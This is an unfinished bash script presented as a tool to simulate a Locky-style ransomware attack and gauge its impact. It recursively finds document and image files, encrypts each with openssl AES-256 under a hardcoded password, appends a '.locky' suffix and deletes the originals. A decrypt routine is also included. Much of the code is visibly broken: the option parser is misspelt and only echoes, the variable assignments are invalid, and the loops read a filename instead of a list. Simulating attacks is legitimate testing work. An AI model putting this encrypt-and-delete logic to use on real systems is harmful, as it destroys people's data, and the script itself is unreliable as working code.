#!/bin/bash
# Purpose:  Gauge impact and simulate a crypto malware attack
# Author: David Pratt
# Date: August, 2016
##############################################################

##### declare variables
target_path=""
target_file=""
file_list=""
target_list=""
encrypted_file=""
decrypted_file=""
encrypted_file_list=""
file_suffix=".locky"
ciphertext="chuggles"
# set target file extensions in this array
declare -a target_types=(".docx" ".xlsx" ".txt" ".jpeg" ".png" ".jpg")


##### declare functions

# TO DO: finish script usage
function usage {
	echo "###############################################"
	echo "############### cryptotester.sh ###############"
	echo "###############################################"
	echo ""
	echo "Usage:  cryptotester.sh [-t|-T] [-f|-e|-d]"
	echo "Required options: -t <target_path> OR -T <file_containing_paths>"
	echo "           -f (find target files) OR -e (encrypt) OR -d (decrypt)"
	echo ""
	echo "Example:  cryptotester.sh -t /tmp/ -e"
	echo ""
	echo "Options explained:"
	echo " -h 		:help -- display this usage function"
	echo " -l <output_file>	:list -- sets a path to an output file;" 
	echo "			:  this file will store a list of files found"
	echo "			:  that will be targetted for encryption/decryption"
	echo " -t		:target -- specifies the target path to recursively"
	echo "			:  check for target files (by extension)" 
	echo " -T		:target_2 -- specified a file containing target files"
	echo "			:  each target should be a fully qualified path and"
	echo "			:  there should only be one target/path per line"
	echo " -f 		:find -- will not encrypt or decrypt files, but"
	echo "			:  will simply recurse through path and find targets;"
	echo " 			:  this is used best in conjunction with (-l) to create"
	echo "			:  a target file for use for later action"
	echo " -e 		:encrypt -- sets action to 'encrypt' all target files"
	echo " 			:  this will also remove the unencrypted target files"
	echo "			:  unless the encrypted version of the file is not found"
	echo " -E		:encrypt_2 -- same as 'encrypt' (-e), but target files "
	echo "			:  are left in place and not removed"
	echo " -d		:decrypt -- sets action to 'decrypt' all target files"
	echo " 			:  this will decrypt all target files and leave file "
	echo " 			:  extensions intact"
	echo " -D		:decrypt_2 -- same as 'decrypt' (-d), but removes " 
	echo " 			:  file extensions.  This is useful if your target "
	echo " 			:  files have an appended extension you do not want"
	echo "			:  such as 'document_name.docx.locky' "
	echo " -p		:password -- sets the ciphertext to be used for the "
	echo "			:  encryption or decryption operation"
	echo " -s		:suffix -- if you are encrypting, this will set the "
	echo "			:  suffix to be appended to the file names of the "
	echo " 			:  encrypted files.  e.g. '.locky' will results in "
	echo " 			:  output file such as 'file_name.docx.locky' "
	echo "			:  ...if you are decrypting with -D option, "
	echo "			:  then this is the exension that will be stripped"
	echo "			:  from the file name"
	echo ""
	exit 1
}

# TO DO: write main function here
function main {
	while getops "feEdDpsl:t:T:" OPTION
	do
		case $OPTION in 
			h)
			echo "OPTARG -h specified:"
			usage
			;;
			l)
			echo "option l"
			;;
			t)
			echo "option t"
			;;
			T)
			echo "option T"
			;;
			f)
			echo "option f"
			;;
			e)
			echo "option e"
			;;
			E)
			echo "option E"
			;;
			d)
			echo "option d"
			;;
			D)
			echo "option D"
			;;
			p)
			echo "option p"
			;;
			s)
			echo "option s"
			;;
		esac
	done

	echo "main completed" && exit 0;
}


# TO DO: check mapped drives we have access to

# TO DO: find function - add logic for file count summary
# find_files description:
#   populates $file_list with all the files at the $target_path
#   using the $target_types[@] array, checks our file list for targets
#   and stores these targets in $target_list
function find_files {
    find $target_path -type f 2>/dev/null >> $file_list
    for extension in "${target_types[@]}"
    do
        grep $extension $file_list >> $target_list
    done
#count_docx=$(find . -type f -name '*.docx' 2>/dev/null |wc -l)
}


# encrypt_files description:
#   takes $target_list and encrypts each file using $ciphertext
#   files are read in and saved with a new file extension appended from $file_suffix
#   also, all encrypted files are appended in $encrypted_file_list
function encrypt_files {
    for line in $target_list
    do
        target_file = $line
        encrypted_file = $line.$file_suffix
        echo $encrypted_file >> $encrypted_file_list
        echo "Encrypting file..."
        echo "Target: $target_file"
        openssl enc -in $target_file -out $encrypted_file -e -aes256 -k $ciphertext
	if [ -f "$encrypted_file" ]
	then
		rm $target_file
	else
		echo "Encrypted file was not found; skipping delete step"
	fi
    done
}


# decrypt_files description:
#   takes $target_list and decrypts each file using $ciphertext
#   it is advised that you use the output from encrypt_files function
#   that is stored in $encrypted_file_list as the $target_list
function decrypt_files {
    for line in $target_list
    do
        target_file = $line
        decrypted_file = $( echo $line | sed "s#$file_suffix##" )
        echo "Decrypting file..."
        echo "Target: $target_file"
        openssl enc -in $target_file -out $decrypted_file -d -aes256 -k $ciphertext
    done
}

##### call and execute main function
main

